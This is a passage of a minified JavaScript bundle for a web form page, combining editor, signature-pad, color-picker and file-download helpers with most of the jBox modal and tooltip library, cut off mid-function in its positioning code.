function editorInit(){$(".editor").trumbowyg()}function imagesDelete(){$(".image-preview .delete").on("click",(function(){$(this).parent().remove()}))}function showAdvanced(){$(".show-advanced").on("click",(function(){$(".advanced-content").toggle()}))}function holmesInit(){var t=document.querySelector("#search-template");document.body.contains(t)&&holmes({input:"#search-template",find:".template-item",placeholder:"<h3>No results...</h3>",mark:!1,hiddenAttr:!0,class:{visible:"visible",hidden:"hidden"}})}function signaturePad(){var t=document.getElementById("canvas_signature"),e=document.getElementById("reset_btn");if(document.body.contains(t)){function n(){var e=Math.max(window.devicePixelRatio||1,1);t.width=t.offsetWidth*e,t.height=t.offsetHeight*e,t.getContext("2d").scale(e,e),o.clear()}window.addEventListener("resize",n);var i,o=new SignaturePad(t,{backgroundColor:"rgba(255, 255, 255, 100)"});o.onEnd=new SignaturePadSmooth(o,{takePointsEvery:3,thresholdSmooth:20}),n(),e.addEventListener("click",(function(){o.clear()}),!1),$(".color-controls input").on("change",(function(){var t=$(this).val();o.penColor=t;var e=o.toData();jQuery.each(e,(function(n){setPenColor(e[n],t)})),o.clear(),o.fromData(e)})),$(".range-slider").slider(),$(".range-slider").on("change",(function(){o.onEnd=new SignaturePadSmooth(o,{takePointsEvery:$(this).val(),thresholdSmooth:20})})),$(".signature-transparent input").on("change",(function(){var e=o.toData();$(".signature-transparent input").is(":checked")?o.backgroundColor="rgba(255, 255, 255, 0)":o.backgroundColor="rgba(255, 255, 255, 100)",o.clear(),o.fromData(e),i=t.toDataURL("image/png"),$(".signature-preview").css("background-image","url("+i+")")})),$("#signature-save").on("click",(function(){o.isEmpty()||(i=t.toDataURL("image/png"),$(".signature-preview").css("background-image","url("+i+")"),$("#preview-modal").modal("show"))})),$("#signature-preview-close").on("click",(function(){$("#preview-modal").modal("hide")}))}}function setPenColor(t,e){return jQuery.each(t,(function(t,n){jQuery.each(n,(function(t){"color"==t&&(n[t]=e)}))})),t}function colorPicker(){$("#colorpicker").spectrum({showButtons:!1,color:"#51b7c5",replacerClassName:"color-item",preferredFormat:"hex"}),$("#colorpicker").on("beforeShow.spectrum",(function(){$(this).click()}))}function bom(t,e){return void 0===e?e={autoBom:!1}:"object"!=typeof e&&(console.warn("Deprecated: Expected third argument to be a object"),e={autoBom:!e}),e.autoBom&&/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(t.type)?new Blob([String.fromCharCode(65279),t],{type:t.type}):t}function download(t,e,n){var i=new XMLHttpRequest;i.open("GET",t),i.responseType="blob",i.onload=function(){saveAs(i.response,e,n)},i.onerror=function(){console.error("could not download file")},i.send()}function corsEnabled(t){var e=new XMLHttpRequest;e.open("HEAD",t,!1);try{e.send()}catch(n){}return e.status>=200&&e.status<=299}function click(t){try{t.dispatchEvent(new MouseEvent("click"))}catch(n){var e=document.createEvent("MouseEvents");e.initMouseEvent("click",!0,!0,window,0,0,0,80,20,!1,!1,!1,!1,0,null),t.dispatchEvent(e)}}function jBoxWrapper(t){var e,n=function i(e,n){var o,r;return this.options={id:null,width:"auto",height:"auto",minWidth:null,minHeight:null,maxWidth:null,maxHeight:null,responsiveWidth:!0,responsiveHeight:!0,responsiveMinWidth:100,responsiveMinHeight:100,attach:null,trigger:"click",preventDefault:!1,content:null,getContent:null,title:null,getTitle:null,footer:null,isolateScroll:!0,ajax:{url:null,data:"",reload:!1,getURL:"data-url",getData:"data-ajax",setContent:!0,loadingClass:!0,spinner:!0,spinnerDelay:300,spinnerReposition:!0},cancelAjaxOnClose:!0,target:null,position:{x:"center",y:"center"},outside:null,offset:0,attributes:{x:"left",y:"top"},fixed:!1,adjustPosition:!0,adjustTracker:!1,adjustDistance:5,reposition:!0,repositionOnOpen:!0,repositionOnContent:!0,holdPosition:!0,pointer:!1,pointTo:"target",fade:180,animation:null,theme:"Default",addClass:null,overlay:!1,overlayClass:null,zIndex:1e4,delayOpen:0,delayClose:0,closeOnEsc:!1,closeOnClick:!1,closeOnMouseleave:!1,closeButton:!1,appendTo:t("body"),createOnInit:!1,blockScroll:!1,blockScrollAdjust:!0,draggable:!1,dragOver:!0,autoClose:!1,delayOnHover:!1,showCountdown:!1,preloadAudio:!0,audio:null,volume:100,onInit:null,onAttach:null,onPosition:null,onCreated:null,onOpen:null,onOpenComplete:null,onClose:null,onCloseComplete:null,onDragStart:null,onDragEnd:null},this._pluginOptions={Tooltip:{getContent:"title",trigger:"mouseenter",position:{x:"center",y:"top"},outside:"y",pointer:!0},Mouse:{responsiveWidth:!1,responsiveHeight:!1,adjustPosition:"flip",target:"mouse",trigger:"mouseenter",position:{x:"right",y:"bottom"},outside:"xy",offset:5},Modal:{target:t(window),fixed:!0,blockScroll:!0,closeOnEsc:!0,closeOnClick:"overlay",closeButton:!0,overlay:!0,animation:"zoomIn"}},this.options=t.extend(!0,this.options,this._pluginOptions[e]?this._pluginOptions[e]:i._pluginOptions[e],n),"string"==t.type(e)&&(this.type=e),this.isTouchDevice=(o=" -webkit- -moz- -o- -ms- ".split(" "),r=function(t){return window.matchMedia(t).matches},!!("ontouchstart"in window||window.DocumentTouch&&document instanceof DocumentTouch)||r(["(",o.join("touch-enabled),("),"heartz",")"].join(""))),this.isTouchDevice&&"mouseenter"===this.options.trigger&&!1===this.options.closeOnClick&&(this.options.closeOnClick="body"),this._fireEvent=function(t,e){this.options["_"+t]&&this.options["_"+t].bind(this)(e),this.options[t]&&this.options[t].bind(this)(e)},null===this.options.id&&(this.options.id="jBox"+i._getUniqueID()),this.id=this.options.id,("center"==this.options.position.x&&"x"==this.options.outside||"center"==this.options.position.y&&"y"==this.options.outside)&&(this.options.outside=null),"target"==this.options.pointTo&&(!this.options.outside||"xy"==this.options.outside)&&(this.options.pointer=!1),"object"!=t.type(this.options.offset)?this.options.offset={x:this.options.offset,y:this.options.offset}:this.options.offset=t.extend({x:0,y:0},this.options.offset),"object"!=t.type(this.options.adjustDistance)?this.options.adjustDistance={top:this.options.adjustDistance,right:this.options.adjustDistance,bottom:this.options.adjustDistance,left:this.options.adjustDistance}:this.options.adjustDistance=t.extend({top:5,left:5,right:5,bottom:5},this.options.adjustDistance),this.outside=!(!this.options.outside||"xy"==this.options.outside)&&this.options.position[this.options.outside],this.align=this.outside?this.outside:"center"!=this.options.position.y&&"number"!=t.type(this.options.position.y)?this.options.position.x:"center"!=this.options.position.x&&"number"!=t.type(this.options.position.x)?this.options.position.y:this.options.attributes.x,i.zIndexMax=Math.max(i.zIndexMax||0,"auto"===this.options.zIndex?1e4:this.options.zIndex),"auto"===this.options.zIndex&&(this.adjustZIndexOnOpen=!0,i.zIndexMax+=2,this.options.zIndex=i.zIndexMax,this.trueModal=this.options.overlay),this._getOpp=function(t){return{left:"right",right:"left",top:"bottom",bottom:"top",x:"y",y:"x"}[t]},this._getXY=function(t){return{left:"x",right:"x",top:"y",bottom:"y",center:"x"}[t]},this._getTL=function(t){return{left:"left",right:"left",top:"top",bottom:"top",center:"left",x:"left",y:"top"}[t]},this._getInt=function(e,n){return"auto"==e?"auto":e&&"string"==t.type(e)&&"%"==e.slice(-1)?t(window)["height"==n?"innerHeight":"innerWidth"]()*parseInt(e.replace("%",""))/100:e},this._createSVG=function(e,n){var i=document.createElementNS("http://www.w3.org/2000/svg",e);return t.each(n,(function(t,e){i.setAttribute(e[0],e[1]||"")})),i},this._isolateScroll=function(t){t&&t.length&&t.on("DOMMouseScroll.jBoxIsolateScroll mousewheel.jBoxIsolateScroll",(function(e){var n=e.wheelDelta||e.originalEvent&&e.originalEvent.wheelDelta||-e.detail,i=this.scrollTop+t.outerHeight()-this.scrollHeight>=0,o=this.scrollTop<=0;(n<0&&i||n>0&&o)&&e.preventDefault()}))},this._setTitleWidth=function(){if(!this.titleContainer||"auto"==this.content[0].style.width&&!this.content[0].style.maxWidth)return null;if("none"==this.wrapper.css("display")){this.wrapper.css("display","block");var t=this.content.outerWidth();this.wrapper.css("display","none")}else t=this.content.outerWidth();this.titleContainer.css({maxWidth:Math.max(t,parseInt(this.content[0].style.maxWidth))||null})},this._draggable=function(){if(!this.options.draggable)return!1;var e="title"==this.options.draggable?this.titleContainer:this.options.draggable instanceof t?this.options.draggable:"string"==t.type(this.options.draggable)?t(this.options.draggable):this.wrapper;return!(!(e&&e instanceof t&&e.length)||e.data("jBox-draggable"))&&(e.addClass("jBox-draggable").data("jBox-draggable",!0).on("touchstart mousedown",function(e){if(2==e.button||t(e.target).hasClass("jBox-noDrag")||t(e.target).parents(".jBox-noDrag").length)"touchstart"==e.type&&(t(e.target).hasClass("jBox-closeButton")||t(e.target).parents(".jBox-closeButton").length)&&this.close({ignoreDelay:!0});else{var n,o;"touchstart"==e.type&&e.touches&&e.touches[0]?(n=e.touches[0].pageX,o=e.touches[0].pageY):(n=e.pageX,o=e.pageY),this.draggingStartX=n,this.draggingStartY=o,this.options.dragOver&&!this.trueModal&&parseInt(this.wrapper.css("zIndex"),10)<=i.zIndexMaxDragover&&(i.zIndexMaxDragover+=1,this.wrapper.css("zIndex",i.zIndexMaxDragover));var r=this.wrapper.outerHeight(),s=this.wrapper.outerWidth(),a=this.wrapper.offset().top+r-o,l=this.wrapper.offset().left+s-n;t(document).on("touchmove.jBox-draggable-"+this.id+" mousemove.jBox-draggable-"+this.id,function(t){var e,n;"touchmove"==t.type&&t.touches&&t.touches[0]?(e=t.touches[0].pageX,n=t.touches[0].pageY):(e=t.pageX,n=t.pageY),this.dragging||this.draggingStartX==e||this.draggingStartY==n||(this._fireEvent("onDragStart"),this.dragging=!0),this.wrapper.offset({top:n+a-r,left:e+l-s})}.bind(this)),e.preventDefault()}}.bind(this)).on("touchend mouseup",function(){if(t(document).off("touchmove.jBox-draggable-"+this.id+" mousemove.jBox-draggable-"+this.id),this.dragging&&this._fireEvent("onDragEnd"),this.dragging=!1,("Modal"==this.type||"Confirm"==this.type)&&this.options.holdPosition){var e=t("#"+this.id).offset(),n={x:e.left-t(document).scrollLeft(),y:e.top-t(document).scrollTop()};this.position({position:n,offset:{x:0,y:0}})}}.bind(this)),this.trueModal||(i.zIndexMaxDragover=i.zIndexMaxDragover?Math.max(i.zIndexMaxDragover,this.options.zIndex):this.options.zIndex),this)},this._create=function(){if(!this.wrapper){if(this.wrapper=t("<div/>",{id:this.id,class:"jBox-wrapper"+(this.type?" jBox-"+this.type:"")+(this.options.theme?" jBox-"+this.options.theme:"")+(this.options.addClass?" "+this.options.addClass:"")}).css({position:this.options.fixed?"fixed":"absolute",display:"none",opacity:0,zIndex:this.options.zIndex}).data("jBox",this),this.options.closeOnMouseleave&&this.wrapper.on("mouseleave",function(e){!this.source||e.relatedTarget!=this.source[0]&&-1===t.inArray(this.source[0],t(e.relatedTarget).parents("*"))&&this.close()}.bind(this)),"box"==this.options.closeOnClick&&this.wrapper.on("click tap",function(){this.close({ignoreDelay:!0})}.bind(this)),this.container=t('<div class="jBox-container"/>').appendTo(this.wrapper),this.content=t('<div class="jBox-content"/>').appendTo(this.container),this.options.footer&&(this.footer=t('<div class="jBox-footer"/>').append(this.options.footer).appendTo(this.container)),this.options.isolateScroll&&this._isolateScroll(this.content),this.options.closeButton){var e=this._createSVG("svg",[["viewBox","0 0 24 24"]]);e.appendChild(this._createSVG("path",[["d","M22.2,4c0,0,0.5,0.6,0,1.1l-6.8,6.8l6.9,6.9c0.5,0.5,0,1.1,0,1.1L20,22.3c0,0-0.6,0.5-1.1,0L12,15.4l-6.9,6.9c-0.5,0.5-1.1,0-1.1,0L1.7,20c0,0-0.5-0.6,0-1.1L8.6,12L1.7,5.1C1.2,4.6,1.7,4,1.7,4L4,1.7c0,0,0.6-0.5,1.1,0L12,8.5l6.8-6.8c0.5-0.5,1.1,0,1.1,0L22.2,4z"]])),this.closeButton=t('<div class="jBox-closeButton jBox-noDrag"/>').on("click tap",function(){this.close({ignoreDelay:!0})}.bind(this)).append(e),"box"!=this.options.closeButton&&(!0!==this.options.closeButton||this.options.overlay||this.options.title||this.options.getTitle)||(this.wrapper.addClass("jBox-closeButton-box"),this.closeButton.appendTo(this.container))}if(this.wrapper.appendTo(this.options.appendTo),this.wrapper.find(".jBox-closeButton").length&&t.each(["top","right","bottom","left"],function(t,e){this.wrapper.find(".jBox-closeButton").css(e)&&"auto"!=this.wrapper.find(".jBox-closeButton").css(e)&&(this.options.adjustDistance[e]=Math.max(this.options.adjustDistance[e],this.options.adjustDistance[e]+-1*((parseInt(this.wrapper.find(".jBox-closeButton").css(e))||0)+(parseInt(this.container.css("border-"+e+"-width"))||0))))}.bind(this)),this.options.pointer){if(this.pointer={position:"target"!=this.options.pointTo?this.options.pointTo:this._getOpp(this.outside),xy:"target"!=this.options.pointTo?this._getXY(this.options.pointTo):this._getXY(this.outside),align:"center",offset:0},this.pointer.element=t('<div class="jBox-pointer jBox-pointer-'+this.pointer.position+'"/>').appendTo(this.wrapper),this.pointer.dimensions={x:this.pointer.element.outerWidth(),y:this.pointer.element.outerHeight()},"string"==t.type(this.options.pointer)){var n=this.options.pointer.split(":");n[0]&&(this.pointer.align=n[0]),n[1]&&(this.pointer.offset=parseInt(n[1]))}this.pointer.alignAttribute="x"==this.pointer.xy?"bottom"==this.pointer.align?"bottom":"top":"right"==this.pointer.align?"right":"left",this.wrapper.css("padding-"+this.pointer.position,this.pointer.dimensions[this.pointer.xy]),this.pointer.element.css(this.pointer.alignAttribute,"center"==this.pointer.align?"50%":0).css("margin-"+this.pointer.alignAttribute,this.pointer.offset),this.pointer.margin={},this.pointer.margin["margin-"+this.pointer.alignAttribute]=this.pointer.offset,"center"==this.pointer.align&&this.pointer.element.css("transform","translate("+("y"==this.pointer.xy?-.5*this.pointer.dimensions.x+"px":0)+", "+("x"==this.pointer.xy?-.5*this.pointer.dimensions.y+"px":0)+")"),this.pointer.element.css("x"==this.pointer.xy?"width":"height",parseInt(this.pointer.dimensions[this.pointer.xy])+parseInt(this.container.css("border-"+this.pointer.alignAttribute+"-width"))),this.wrapper.addClass("jBox-pointerPosition-"+this.pointer.position)}this.setContent(this.options.content,!0),this.setTitle(this.options.title,!0),this.options.draggable&&this._draggable(),this._fireEvent("onCreated")}},this.options.createOnInit&&this._create(),this.options.attach&&this.attach(),this._attachEvents=function(){this.options.delayOnHover&&t("#"+this.id).on("mouseenter",function(){this.isHovered=!0}.bind(this)),this.options.delayOnHover&&t("#"+this.id).on("mouseleave",function(){this.isHovered=!1}.bind(this)),(this.options.adjustPosition||this.options.reposition)&&!this.fixed&&this.outside&&(this.options.adjustTracker&&t(window).on("scroll.jBox-"+this.id,function(){this.position()}.bind(this)),(this.options.adjustPosition||this.options.reposition)&&t(window).on("resize.jBox-"+this.id,function(){this.position()}.bind(this))),"mouse"==this.options.target&&t("body").on("mousemove.jBox-"+this.id,function(t){this.position({mouseTarget:{top:t.pageY,left:t.pageX}})}.bind(this))},this._detachEvents=function(){this.options.closeOnEsc&&t(document).off("keyup.jBox-"+this.id),(!0===this.options.closeOnClick||"body"==this.options.closeOnClick)&&t(document).off("click.jBox-"+this.id+" tap.jBox-"+this.id),this.options.adjustTracker&&t(window).off("scroll.jBox-"+this.id),(this.options.adjustPosition||this.options.reposition)&&t(window).off("resize.jBox-"+this.id),"mouse"==this.options.target&&t("body").off("mousemove.jBox-"+this.id)},this._showOverlay=function(){this.overlay||(this.overlay=t('<div id="'+this.id+'-overlay"/>').addClass("jBox-overlay"+(this.type?" jBox-overlay-"+this.type:"")).css({display:"none",opacity:0,zIndex:this.options.zIndex-1}).appendTo(this.options.appendTo),this.options.overlayClass&&this.overlay.addClass(this.options.overlayClass),("overlay"==this.options.closeButton||!0===this.options.closeButton)&&this.overlay.append(this.closeButton),"overlay"==this.options.closeOnClick&&this.overlay.on("click tap",function(){this.close({ignoreDelay:!0})}.bind(this)),t("#"+this.id+"-overlay .jBox-closeButton").length&&(this.options.adjustDistance.top=Math.max(t("#"+this.id+"-overlay .jBox-closeButton").outerHeight(),this.options.adjustDistance.top))),!0===this.adjustZIndexOnOpen&&this.overlay.css("zIndex",parseInt(this.wrapper.css("zIndex"),10)-1),"block"!=this.overlay.css("display")&&(this.options.fade?this.overlay.stop()&&this.overlay.animate({opacity:1},{queue:!1,duration:this.options.fade,start:function(){this.overlay.css({display:"block"})}.bind(this)}):this.overlay.css({display:"block",opacity:1}))},this._hideOverlay=function(){this.overlay&&(this.options.fade?this.overlay.stop()&&this.overlay.animate({opacity:0},{queue:!1,duration:this.options.fade,complete:function(){this.overlay.css({display:"none"})}.bind(this)}):this.overlay.css({display:"none",opacity:0}))},this._exposeDimensions=function(){this.wrapper.css({top:-1e4,left:-1e4,right:"auto",bottom:"auto"});var t={x:this.wrapper.outerWidth(),y:this.wrapper.outerHeight()};return this.wrapper.css({top:"auto",left:"auto"}),t},this._generateAnimationCSS=function(){if("object"!=t.type(this.options.animation)&&(this.options.animation={pulse:{open:"pulse",close:"zoomOut"},zoomIn:{open:"zoomIn",close:"zoomIn"},zoomOut:{open:"zoomOut",close:"zoomOut"},move:{open:"move",close:"move"},slide:{open:"slide",close:"slide"},flip:{open:"flip",close:"flip"},tada:{open:"tada",close:"zoomOut"}}[this.options.animation]),!this.options.animation)return null;this.options.animation.open&&(this.options.animation.open=this.options.animation.open.split(":")),this.options.animation.close&&(this.options.animation.close=this.options.animation.close.split(":")),this.options.animation.openDirection=this.options.animation.open[1]?this.options.animation.open[1]:null,this.options.animation.closeDirection=this.options.animation.close[1]?this.options.animation.close[1]:null,this.options.animation.open&&(this.options.animation.open=this.options.animation.open[0]),this.options.animation.close&&(this.options.animation.close=this.options.animation.close[0]),this.options.animation.open&&(this.options.animation.open+="Open"),this.options.animation.close&&(this.options.animation.close+="Close");var e={pulse:{duration:350,css:[["0%","scale(1)"],["50%","scale(1.1)"],["100%","scale(1)"]]},zoomInOpen:{duration:this.options.fade||180,css:[["0%","scale(0.9)"],["100%","scale(1)"]]},zoomInClose:{duration:this.options.fade||180,css:[["0%","scale(1)"],["100%","scale(0.9)"]]},zoomOutOpen:{duration:this.options.fade||180,css:[["0%","scale(1.1)"],["100%","scale(1)"]]},zoomOutClose:{duration:this.options.fade||180,css:[["0%","scale(1)"],["100%","scale(1.1)"]]},moveOpen:{duration:this.options.fade||180,positions:{top:{"0%":-12},right:{"0%":12},bottom:{"0%":12},left:{"0%":-12}},css:[["0%","translate%XY(%Vpx)"],["100%","translate%XY(0px)"]]},moveClose:{duration:this.options.fade||180,timing:"ease-in",positions:{top:{"100%":-12},right:{"100%":12},bottom:{"100%":12},left:{"100%":-12}},css:[["0%","translate%XY(0px)"],["100%","translate%XY(%Vpx)"]]},slideOpen:{duration:400,positions:{top:{"0%":-400},right:{"0%":400},bottom:{"0%":400},left:{"0%":-400}},css:[["0%","translate%XY(%Vpx)"],["100%","translate%XY(0px)"]]},slideClose:{duration:400,timing:"ease-in",positions:{top:{"100%":-400},right:{"100%":400},bottom:{"100%":400},left:{"100%":-400}},css:[["0%","translate%XY(0px)"],["100%","translate%XY(%Vpx)"]]},flipOpen:{duration:600,css:[["0%","perspective(400px) rotateX(90deg)"],["40%","perspective(400px) rotateX(-15deg)"],["70%","perspective(400px) rotateX(15deg)"],["100%","perspective(400px) rotateX(0deg)"]]},flipClose:{duration:this.options.fade||300,css:[["0%","perspective(400px) rotateX(0deg)"],["100%","perspective(400px) rotateX(90deg)"]]},tada:{duration:800,css:[["0%","scale(1)"],["10%, 20%","scale(0.9) rotate(-3deg)"],["30%, 50%, 70%, 90%","scale(1.1) rotate(3deg)"],["40%, 60%, 80%","scale(1.1) rotate(-3deg)"],["100%","scale(1) rotate(0)"]]}};t.each(["pulse","tada"],(function(t,n){e[n+"Open"]=e[n+"Close"]=e[n]}));var n=function(n,i){var o="@keyframes jBox-"+this.id+"-animation-"+this.options.animation[n]+"-"+n+(i?"-"+i:"")+" {";return t.each(e[this.options.animation[n]].css,function(t,r){var s=i?r[1].replace("%XY",this._getXY(i).toUpperCase()):r[1];e[this.options.animation[n]].positions&&(s=s.replace("%V",e[this.options.animation[n]].positions[i][r[0]])),o+=r[0]+" {transform:"+s+";}"}.bind(this)),o+="}",o+=".jBox-"+this.id+"-animation-"+this.options.animation[n]+"-"+n+(i?"-"+i:"")+" {",o+="animation-duration: "+e[this.options.animation[n]].duration+"ms;",o+="animation-name: jBox-"+this.id+"-animation-"+this.options.animation[n]+"-"+n+(i?"-"+i:"")+";",o+=e[this.options.animation[n]].timing?"animation-timing-function: "+e[this.options.animation[n]].timing+";":"",o+="}"}.bind(this);this._animationCSS="",t.each(["open","close"],function(i,o){if(!this.options.animation[o]||!e[this.options.animation[o]]||"close"==o&&!this.options.fade)return"";e[this.options.animation[o]].positions?t.each(["top","right","bottom","left"],function(t,e){this._animationCSS+=n(o,e)}.bind(this)):this._animationCSS+=n(o)}.bind(this))},this.options.animation&&this._generateAnimationCSS(),this._blockBodyClick=function(){this.blockBodyClick=!0,setTimeout(function(){this.blockBodyClick=!1}.bind(this),10)},this._animate=function(t){if(!t&&(t=this.isOpen?"open":"close"),!this.options.fade&&"close"==t)return null;var e=this.options.animation[t+"Direction"]||("center"!=this.align?this.align:this.options.attributes.x);this.flipped&&this._getXY(e)==this._getXY(this.align)&&(e=this._getOpp(e));var n="jBox-"+this.id+"-animation-"+this.options.animation[t]+"-"+t+" jBox-"+this.id+"-animation-"+this.options.animation[t]+"-"+t+"-"+e;this.wrapper.addClass(n);var i=1e3*parseFloat(this.wrapper.css("animation-duration"));"close"==t&&(i=Math.min(i,this.options.fade)),setTimeout(function(){this.wrapper&&this.wrapper.removeClass(n)}.bind(this),i)},this._abortAnimation=function(){var t=this.wrapper.attr("class").split(" ").filter(function(t){return 0!==t.lastIndexOf("jBox-"+this.id+"-animation",0)}.bind(this));this.wrapper.attr("class",t.join(" "))},(this.options.responsiveWidth||this.options.responsiveHeight)&&t(window).on("resize.responsivejBox-"+this.id,function(){this.isOpen&&this.position()}.bind(this)),"string"===t.type(this.options.preloadAudio)&&(this.options.preloadAudio=[this.options.preloadAudio]),"string"===t.type(this.options.audio)&&(this.options.audio={open:this.options.audio}),"number"===t.type(this.options.volume)&&(this.options.volume={open:this.options.volume,close:this.options.volume}),!0===this.options.preloadAudio&&this.options.audio&&(this.options.preloadAudio=[],t.each(this.options.audio,function(t,e){this.options.preloadAudio.push(e+".mp3"),this.options.preloadAudio.push(e+".ogg")}.bind(this))),this.options.preloadAudio.length&&t.each(this.options.preloadAudio,(function(t,e){var n=new Audio;n.src=e,n.preload="auto"})),this._fireEvent("onInit"),this};return n.prototype.attach=function(e,n){return!e&&(e=this.options.attach),"string"==t.type(e)&&(e=t(e)),!n&&(n=this.options.trigger),e&&e.length&&t.each(e,function(e,i){(i=t(i)).data("jBox-attached-"+this.id)||("title"==this.options.getContent&&null!=i.attr("title")&&i.data("jBox-getContent",i.attr("title")).removeAttr("title"),this.attachedElements||(this.attachedElements=[]),this.attachedElements.push(i[0]),i.on(n+".jBox-attach-"+this.id,function(t){if(this.timer&&clearTimeout(this.timer),"mouseenter"!=n||!this.isOpen||this.source[0]!=i[0]){if(this.isOpen&&this.source&&this.source[0]!=i[0])var e=!0;this.source=i,!this.options.target&&(this.target=i),"click"==n&&this.options.preventDefault&&t.preventDefault(),this["click"!=n||e?"open":"toggle"]()}}.bind(this)),"mouseenter"==this.options.trigger&&i.on("mouseleave",function(e){if(!this.wrapper)return null;this.options.closeOnMouseleave&&(e.relatedTarget==this.wrapper[0]||t(e.relatedTarget).parents("#"+this.id).length)||this.close()}.bind(this)),i.data("jBox-attached-"+this.id,n),this._fireEvent("onAttach",i))}.bind(this)),this},n.prototype.detach=function(e){return!e&&(e=this.attachedElements||[]),e&&e.length&&t.each(e,function(e,n){(n=t(n)).data("jBox-attached-"+this.id)&&(n.off(n.data("jBox-attached-"+this.id)+".jBox-attach-"+this.id),n.data("jBox-attached-"+this.id,null)),this.attachedElements=t.grep(this.attachedElements,(function(t){return t!=n[0]}))}.bind(this)),this},n.prototype.setTitle=function(e,n){if(null==e||null==e)return this;!this.wrapper&&this._create();var i=this.wrapper.outerHeight(),o=this.wrapper.outerWidth();return this.title||(this.titleContainer=t('<div class="jBox-title"/>'),this.title=t("<div/>").appendTo(this.titleContainer),("title"==this.options.closeButton||!0===this.options.closeButton&&!this.options.overlay)&&(this.wrapper.addClass("jBox-closeButton-title"),this.closeButton.appendTo(this.titleContainer)),this.titleContainer.insertBefore(this.content),this._setTitleWidth()),this.wrapper[e?"addClass":"removeClass"]("jBox-hasTitle"),this.title.html(e),o!=this.wrapper.outerWidth()&&this._setTitleWidth(),this.options.draggable&&this._draggable(),!n&&this.options.repositionOnContent&&(i!=this.wrapper.outerHeight()||o!=this.wrapper.outerWidth())&&this.position(),this},n.prototype.setContent=function(e,n){if(null==e||null==e)return this;!this.wrapper&&this._create();var i=this.wrapper.outerHeight(),o=this.wrapper.outerWidth();switch(this.content.children("[data-jbox-content-appended]").appendTo("body").css({display:"none"}),t.type(e)){case"string":this.content.html(e);break;case"object":e&&(e instanceof t||e.constructor.prototype.jquery)?(this.content.html(""),e.attr("data-jbox-content-appended",1).appendTo(this.content).css({display:"block"})):this.content.html(JSON.stringify(e))}return o!=this.wrapper.outerWidth()&&this._setTitleWidth(),this.options.draggable&&this._draggable(),!n&&this.options.repositionOnContent&&(i!=this.wrapper.outerHeight()||o!=this.wrapper.outerWidth())&&this.position(),this},n.prototype.setDimensions=function(t,e,n){!this.wrapper&&this._create(),null==e&&(e="auto"),this.content.css(t,this._getInt(e)),"width"==t&&this._setTitleWidth(),this.options[t]=e,(null==n||n)&&this.position()},n.prototype.setWidth=function(t,e){this.setDimensions("width",t,e)},n.prototype.setHeight=function(t,e){this.setDimensions("height",t,e)},n.prototype.position=function(e){if(!e&&(e={}),e=t.extend(!0,this.options,e),this.target=e.target||this.target||t(window),!(this.target instanceof t||"mouse"==this.target)&&(this.target=t(this.target)),!this.target.length)return this;this.content.css({width:this._getInt(e.width,"width"),height:this._getInt(e.height,"height"),minWidth:this._getInt(e.minWidth,"width"),minHeight:this._getInt(e.minHeight,"height"),maxWidth:this._getInt(e.maxWidth,"width"),maxHeight:this._getInt(e.maxHeight,"height")}),this._setTitleWidth();var n=this._exposeDimensions();"mouse"!=this.target&&!this.target.data("jBox-"+this.id+"-fixed")&&this.target.data("jBox-"+this.id+"-fixed",this.target[0]!=t(window)[0]&&("fixed"==this.target.css("position")||this.target.parents().filter((function(){return"fixed"==t(this).css("position")})).length>0)?"fixed":"static");var i={x:t(window).outerWidth(),y:t(window).outerHeight(),top:e.fixed&&this.target.data("jBox-"+this.id+"-fixed")?0:t(window).scrollTop(),left:e.fixed&&this.target.data("jBox-"+this.id+"-fixed")?0:t(window).scrollLeft()};i.bottom=i.top+i.y,i.right=i.left+i.x;try{var o=this.target.offset()}catch(E){o={top:0,left:0}}"mouse"!=this.target&&"fixed"==this.target.data("jBox-"+this.id+"-fixed")&&e.fixed&&(o.top=o.top-t(window).scrollTop(),o.left=o.left-t(window).scrollLeft());var r={x:"mouse"==this.target?12:this.target.outerWidth(),y:"mouse"==this.target?20:this.target.outerHeight(),top:"mouse"==this.target&&e.mouseTarget?e.mouseTarget.top:o?o.top:0,left:"mouse"==this.target&&e.mouseTarget?e.mouseTarget.left:o?o.left:0},s=e.outside&&!("center"==e.position.x&&"center"==e.position.y),a={x:i.x-e.adjustDistance.left-e.adjustDistance.right,y:i.y-e.adjustDistance.top-e.adjustDistance.bottom,left:s?r.left-t(window).scrollLeft()-e.adjustDistance.left:0,right:s?i.x-r.left+t(window).scrollLeft()-r.x-e.adjustDistance.right:0,top:s?r.top-t(window).scrollTop()-this.options.adjustDistance.top:0,bottom:s?i.y-r.top+t(window).scrollTop()-r.y-e.adjustDistance.bottom:0},l={x:"x"!=e.outside&&"xy"!=e.outside||"number"==t.type(e.position.x)?null:e.position.x,y:"y"!=e.outside&&"xy"!=e.outside||"number"==t.type(e.position.y)?null:e.position.y},c={x:!1,y:!1};if(l.x&&n.x>a[l.x]&&a[this._getOpp(l.x)]>a[l.x]&&(l.x=this._getOpp(l.x))&&(c.x=!0),l.y&&n.y>a[l.y]&&a[this._getOpp(l.y)]>a[l.y]&&(l.y=this._getOpp(l.y))&&(c.y=!0),e.responsiveWidth||e.responsiveHeight){var u=function(){if(e.responsiveWidth&&n.x>a[l.x||"x"]){var t=a[l.x||"x"]-(this.pointer&&s&&"x"==e.outside?this.pointer.dimensions.x:0)-parseInt(this.container.css("border-left-width"))-parseInt(this.container.css("border-right-width"));this.content.css({width:t>this.options.responsiveMinWidth?t:null,minWidth:t<parseInt(this.content.css("minWidth"))?0:null}),this._setTitleWidth()}n=this._exposeDimensions()}.bind(this);e.responsiveWidth&&u(),e.responsiveWidth&&!c.y&&l.y&&n.y>a[l.y]&&a[this._getOpp(l.y)]>a[l.y]&&(l.y=this._getOpp(l.y))&&(c.y=!0);var h=function(){if(e.responsiveHeight&&n.y>a[l.y||"y"]){var t=function(){if(!this.titleContainer&&!this.footer)return 0;if("none"==this.wrapper.css("display")){this.wrapper.css("display","block");var t=(this.titleContainer?this.titleContainer.outerHeight():0)+(this.footer?this.footer.outerHeight():0);this.wrapper.css("display","none")}else t=(this.titleContainer?this.titleContainer.outerHeight():0)+(this.footer?this.footer.outerHeight():0);return 